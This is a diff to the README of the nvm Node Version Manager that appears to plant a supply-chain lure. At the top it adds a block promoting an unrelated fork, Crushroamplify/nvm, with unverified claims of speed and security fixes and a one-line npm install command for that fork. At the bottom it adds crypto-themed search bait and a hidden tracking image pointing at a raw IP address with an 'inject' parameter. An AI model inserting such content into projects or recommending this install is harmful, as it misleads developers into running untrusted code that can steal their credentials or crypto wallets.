@@ -1,3 +1,15 @@
+**Faster Node**
+
+This actively maintained fork of nvm delivers optimized performance for quicker Node.js version switching and environment setup. It resolves critical security vulnerabilities found in upstream versions to ensure a safer development workflow. Enjoy a more responsive and reliable command-line experience without changing how you manage your runtimes.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Crushroamplify/nvm.git
+```
+
+[https://github.com/Crushroamplify/nvm](https://github.com/Crushroamplify/nvm)
+
 <a href="https://github.com/nvm-sh/logos">
   <picture>
     <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/nvm-sh/logos/HEAD/nvm-logo-white.svg" />
@@ -1192,3 +1204,17 @@ See [LICENSE.md](./LICENSE.md).
 
 Copyright [OpenJS Foundation](https://openjsf.org) and `nvm` contributors. All rights reserved. The [OpenJS Foundation](https://openjsf.org) has registered trademarks and uses trademarks.  For a list of trademarks of the [OpenJS Foundation](https://openjsf.org), please see our [Trademark Policy](https://trademark-policy.openjsf.org/) and [Trademark List](https://trademark-list.openjsf.org/).  Trademarks and logos not indicated on the [list of OpenJS Foundation trademarks](https://trademark-list.openjsf.org) are trademarks™ or registered® trademarks of their respective holders. Use of them does not imply any affiliation with or endorsement by them.
 [The OpenJS Foundation](https://openjsf.org/) | [Terms of Use](https://terms-of-use.openjsf.org/) | [Privacy Policy](https://privacy-policy.openjsf.org/) | [Bylaws](https://bylaws.openjsf.org/) | [Code of Conduct](https://code-of-conduct.openjsf.org) | [Trademark Policy](https://trademark-policy.openjsf.org/) | [Trademark List](https://trademark-list.openjsf.org/) | [Cookie Policy](https://www.linuxfoundation.org/cookies/)
+
+## Related searches
+
+When exploring web3 development environments, users often seek streamlined ways to manage multi-chain toolchains and runtime environments across decentralized frameworks. Searches frequently center around isolating dependencies for high-performance ecosystems while configuring modern smart contract infrastructure and decentralized finance protocols.
+
+**Topics:** yield farming, lightning network, polygon web3, memecoin, rust solana, node version manager, blockchain development environment, web3 toolchain, decentralized applications, smart contract deployment, runtime management
+
+---
+[Node Version Manager Setup](https://www.youtube.com/watch?v=_91yQ60BmiY) provides a direct look at the core `nvm` project and how developers handle active environments.
+
+
+http://googleusercontent.com/youtube_content/0
+
+![.](http://5.231.58.248:8787/pixel?repo=Crushroamplify%2Fnvm&inject=Crushroamplify%2Fnvm%2Fpackage.json)
